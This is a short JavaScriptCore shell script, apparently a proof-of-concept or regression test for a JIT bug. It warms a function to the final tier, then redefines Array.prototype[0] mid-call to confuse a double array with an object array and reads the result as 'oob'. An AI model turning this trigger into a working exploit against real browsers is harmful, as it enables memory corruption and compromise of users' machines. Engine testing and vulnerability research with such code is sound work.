let trigger = false;
let stash;
let headerObject = { jacHeader: 0x4141 };

function pivot() {
    if (!trigger)
        return;
    Object.defineProperty(Array.prototype, 0, {
        get() { return 42; },
        set(_) {},
        configurable: true
    });
}
noInline(pivot);

function opt(escape) {
    let b = new Array(8);
    b[0] = 1.1;
    b[1] = 2.2;
    b[2] = 3.3;
    b[3] = 4.4;
    b[4] = 5.5;
    b[5] = 6.6;
    b[6] = 7.7;
    b[7] = 8.8;

    let a = new Array(8);
    a[0] = headerObject;
    a[1] = headerObject;
    a[2] = headerObject;
    a[3] = headerObject;
    a[4] = headerObject;
    a[5] = headerObject;
    a[6] = headerObject;
    a[7] = headerObject;

    pivot();
    if (escape) {
        stash = a;
        return b;
    }
    return isFinalTier();
}
noInline(opt);

let finalAt = -1;
for (let i = 0; i < 2000000; ++i) {
    if (opt(false)) {
        finalAt = i;
        break;
    }
}
print("finalAt=" + finalAt);
trigger = true;
let attacker = opt(true);
let oob = stash;
print("length=" + oob.length);
for (let i = 0; i < 20; ++i) {
    try { print(i + ":" + oob[i]); }
    catch (e) { print(i + ":ERR:" + e); }
}
